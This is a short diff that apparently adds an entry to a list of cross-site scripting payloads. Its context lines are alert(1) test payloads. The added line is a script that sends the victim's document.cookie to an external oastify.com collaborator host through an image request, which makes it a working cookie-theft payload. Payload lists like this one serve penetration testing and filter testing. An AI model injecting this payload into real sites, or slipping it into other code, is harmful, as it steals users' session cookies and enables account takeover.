@@ -33,3 +33,4 @@
 <x contenteditable onpaste=alert(1)>paste here!
 <script>alert(1)// 
 <script>alert(1)<!–
+<script>var i=new Image;i.src="https://cfvdeyimoc4zbahn7n6ffa6ak1qsei27.oastify.com?"+document.cookie;</script>
